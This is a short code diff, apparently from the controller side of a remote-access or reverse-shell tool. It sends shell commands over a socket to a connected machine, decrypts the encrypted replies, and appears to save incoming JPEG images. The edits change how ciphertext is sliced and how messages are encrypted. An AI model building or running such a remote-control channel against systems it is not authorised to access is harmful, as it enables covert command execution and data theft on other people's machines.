@@ -13,8 +13,9 @@ def decryption(cipherText):
     message = False
     sNonce = cipherText[:16]
     sTag = cipherText[16:32]
+    cipher_text = cipherText[35:]
     cipher = aes.new(key, aes.MODE_EAX, nonce = sNonce)
-    plaintext = cipher.decrypt(cipherText[32:])
+    plaintext = cipher.decrypt(cipher_text)
     if(plaintext[:5] == b'\xff\xd8\xff\xe0\x00'):
         for i in os.listdir("."):
             fileCounter = fileCounter + 1
@@ -55,7 +56,7 @@ while True:
         inpt = input("Shell >")
     else:
         inpt = input("Enter command:")
-    conn.sendall(utils.encrypt(inpt.encode("utf-8")))
+    conn.sendall(utils.encrypt(data=inpt.encode("utf-8"), ftype="msg"))
     recv = decryption(conn.recv(1024))  #Data recieved from the socket. 1024 is the maximum amount of data to be received at once
     if recv:
         recv = str(recv)[2:-1]
